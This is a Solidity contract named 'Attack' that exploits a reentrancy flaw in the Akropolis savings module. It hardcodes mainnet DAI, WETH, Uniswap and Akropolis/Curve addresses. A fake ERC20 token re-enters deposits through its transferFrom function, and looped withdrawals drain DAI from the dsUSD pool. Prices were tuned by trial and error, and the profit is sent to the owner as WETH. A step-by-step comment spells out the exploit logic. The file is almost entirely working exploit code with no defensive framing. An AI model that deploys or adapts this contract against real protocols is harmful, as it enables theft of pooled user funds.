// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;

import "./ISavingsModule.sol";
import "./IUniswapV2Router02.sol";
import "./Interfaces.sol";
import "./fake_ERC20.sol";
import "hardhat/console.sol";

/*
    Exploit logic:
    1) Somehow obtain some (1000 here) DAI (can be done via FL)
    2) Call Akropolis with X amount of Fake Token
    2.5) Reenter Akropolis via Fake Token's transferFrom - send X DAI to AKRO
    3) Burn the dsUSD (Akro token) obtained -> Take 2*X real DAI (twice the amount sent from transferFrom)
    4) GOTO (2)
*/

contract Attack is FakeERC20 {

    address payable owner;
    address payable daiAddr = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address payable wethAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address payable uniswapV2router02Addr = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address payable akroProxyContract = 0x73fC3038B4cD8FfD07482b92a52Ea806505e5748;

    address payable dsusdTokenAddr = 0x520d25b08080296Db66fd9F268AE279b66a8EfFb;
    address payable susdCurveProtocolAddr = 0x91d7b9a8d2314110D4018C88dBFDCF5E2ba4772E;

    address payable yCurveProtocolAddr = 0x7967adA2A32A633d5C055e2e075A83023B632B4e;
    address payable delphiYCurvePoolToken = 0x2AFA3c8Bf33E65d5036cD0f1c3599716894B3077;
    
    address payable protocolToExploit;
    address payable tokenToExploit;

    uint256 init_dai_used = 1000;

    function set_protocol_to_exploit(uint256 choice) public {
        if (choice == 0) {
            tokenToExploit = dsusdTokenAddr;
            protocolToExploit = susdCurveProtocolAddr;
        }
        else {  // NOTE: yPool exploit does *not* work currently
            tokenToExploit = delphiYCurvePoolToken;  // Delphi Curve yPool
            protocolToExploit = yCurveProtocolAddr;
        }
    }

    constructor() payable public {
        owner = msg.sender;
        set_protocol_to_exploit(0);
        convert_eth_to_dai(init_dai_used, address(this).balance);
        
        // Needed for the 1 DAI transactions
        require(IERC20(daiAddr).approve(akroProxyContract, uint256(-1)), 'approve failed.');
    }

    // **************************************************************************
    // Helper functions

    // 0. Convert ETH to DAI
    function convert_eth_to_dai(uint256 dai_to_receive, uint256 weth_to_send) internal {

        wethAddr.call{value : address(this).balance }("deposit()");
        uint256 daiToReceive = dai_to_receive * 1e18;
        uint256 wethToSend = weth_to_send * 1e18;

        require(IERC20(wethAddr).approve(uniswapV2router02Addr, uint256(-1)), 'approve failed.');  // TODO: remember to approve 0
        require(IERC20(daiAddr).approve(uniswapV2router02Addr, uint256(-1)), 'approve failed.');
        address[] memory path = new address[](2);
        path[0] = wethAddr;
        path[1] = daiAddr;
        IUniswapV2Router02(uniswapV2router02Addr).swapTokensForExactTokens(daiToReceive, wethToSend, path, address(this), block.timestamp);   
    }

    function convert_dai_to_eth() internal {
        address[] memory path = new address[](2);
        path[0] = daiAddr;
        path[1] = wethAddr;
        uint256 daiBalance = IERC20(daiAddr).balanceOf(address(this));
        IUniswapV2Router02(uniswapV2router02Addr).swapExactTokensForTokens(daiBalance, 1, path, address(this), block.timestamp);
        IWETH(wethAddr).withdraw(IERC20(wethAddr).balanceOf(address(this)));
    }

    // 4. Convert DAI to ETH and then to WETH and send to owner (or another address in general - can be customized)
    function send_profit_to_owner_as_weth() public {
        convert_dai_to_eth();
        wethAddr.call{value : address(this).balance }("deposit()");
        IWETH(wethAddr).transfer(owner, IERC20(wethAddr).balanceOf(address(this)));
    }

    function checkBalance() public {
        uint256 balance = IERC20(daiAddr).balanceOf(address(this));
        console.log("[ATK] Attacker Contract DAI Balance is: ", balance / 1e18);
        balance = IERC20(wethAddr).balanceOf(address(this));
        console.log("[ATK] Attacker Contract WETH Balance is: ", balance);
        balance = address(this).balance;
        console.log("[ATK] Attacker Contract ETH Balance is: ", balance);
        balance = IERC20(tokenToExploit).balanceOf(address(this));
        console.log("[ATK] Attacker Contract dsUSD Balance is: ", balance);
        balance = IERC20(daiAddr).balanceOf(susdCurveProtocolAddr);
        console.log("[ATK] AKRO Contract DAI Balance is: ", balance);
        balance = IWETH(wethAddr).balanceOf(owner);
        console.log("[ATK] OWNER WETH Balance is: ", balance);
    }

    // Carefully crafted DAI prices to drain as much DAI as possible from the dsUSD pool (obtained via trial & error though)
    function calc_dai() internal returns (uint256) {
        uint256 balance = IERC20(daiAddr).balanceOf(address(this));
        uint256 max_val = 25000;
        if (balance > 1e6 * 1e18)
            max_val = 20000;
        if (balance > 1172043 * 1e18)
            max_val = 5000;
        uint256 max_balance = max_val * 1e18;
        if (balance > max_balance)
            balance = max_balance;
        return balance;
    }

    // **************************************************************************
    // Exploit functions

    // 2. Reenter Akropolis with actual DAI
    function reenter() internal {
        address[] memory tokens = new address[](1); 
        tokens[0] = address(this);
        uint256[] memory amts = new uint256[](1);
        amts[0] = calc_dai();
        ISavingsModule(akroProxyContract).deposit(protocolToExploit, tokens, amts);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 daiToSend = calc_dai(); // IERC20(daiAddr).balanceOf(address(this));

        address[] memory tokens = new address[](1); 
        tokens[0] = daiAddr;
        uint256[] memory amts = new uint256[](1);
        amts[0] = daiToSend - 1;
        ISavingsModule(akroProxyContract).deposit(protocolToExploit, tokens, amts);

        // Needed because we have to deposit something, otherwise handleDeposit will not work due to fees or
        // being unable to mint from Curve
        IERC20(daiAddr).transfer(protocolToExploit, 1);

        emit Transfer(_from, _to, _value);
        return true;
    }

    function exploit(uint8 loops) public {
        for (uint8 i = 0; i < loops; i++) {
            // 1. Call Akropolis -> Control reaches fake ERC20
            reenter();

            // 3. Withdraw DAI
            withdraw_dai();

            console.log("After 1 exploit loop");
            checkBalance();
        }
    }

    function withdraw_dai() public {
        uint256 akroBalance = IERC20(tokenToExploit).balanceOf(address(this));
        ISavingsModule(akroProxyContract).withdraw(protocolToExploit, daiAddr, 99 * (akroBalance / 100), 0);
    }

    // **************************************************************************
}
